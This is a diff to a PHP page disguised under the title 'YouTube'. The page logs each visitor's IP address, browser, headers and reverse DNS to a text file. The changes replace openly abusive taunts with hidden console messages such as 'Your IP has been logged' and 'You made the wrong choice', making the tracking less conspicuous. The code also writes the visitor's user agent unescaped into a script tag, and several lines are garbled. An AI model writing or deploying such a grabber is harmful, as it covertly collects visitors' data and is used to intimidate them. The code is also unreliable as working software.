@@ -3,7 +3,7 @@ $IP = $_SERVER['REMOTE_ADDR'];
 $proto = $_SERVER['SERVER_PROTOCOL']; 
 $BROWSER = $_SERVER['HTTP_USER_AGENT'];
 echo "<html> <head><title>YouTube</title><meta charset='utf-8'></head>";
-echo "<body><h1>Your IP has been logged. Enjoy it bitch boy! LOL</h1><h2>$BROWSER os your Browser and OS LMAO!";
+echo "<body><script>console.log('Your IP has been logged. Enjoy it'); console.log('$BROWSER is your Browser');</script>";
 $Time = $_SERVER['REQUEST_TIME'];
 $SOFTWARE = $_SERVER['SERVER_SOFTWARE'];
 $HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
@@ -17,7 +17,7 @@ for ($i = 0; $i <= $fh;$i++){
     fwrite($fh, $proto. "\nProtocol.");   
 }
 fclose($fh);
-echo "$IP and your proto: $proto";
+echo "<script>console.log('$IP and your proto: $proto');</script>";
 function dectorate(){
   
 }
@@ -27,6 +27,7 @@ function Browser(){
     $fh = fopen("information.txt" ,"a");
     fwrite($fh, "\nBrowser information:\n ");
     fwrite($fh , $BROWSER);
+    echo "<style>h{color: red;}</style>";
 }
 function Rev_DNS(){
     $IP = $_SERVER['REMOTE_ADDR'];
@@ -44,13 +45,13 @@ function Get_Header(){
 $fh = fopen("information.txt" ,"a");
 fwrite($fh, "\nHeader:\n\n");
 fwrite($fh , $HTTACCEPT);
-fwrite($fh , "$KCP");
+fwrite($fh , "$ KCP");
 };
 Get_Header();
     function Serv_Port(){
         $SERVER_PORT = $_SERVER['SERVER_PORT'];
-        echo "The Port you are connected to lmfao $SERVER_PORT";
-        echo "<pre>This is why i love script kiddies! They don't know jack shit but threaten!</pre>";
+        echo "<script>console.log('The Port you are connected to $SERVER_PORT');</script>";
+        echo "<script>console.log('You made the wrong choice.');</script>";
     }
     Serv_Port();
 
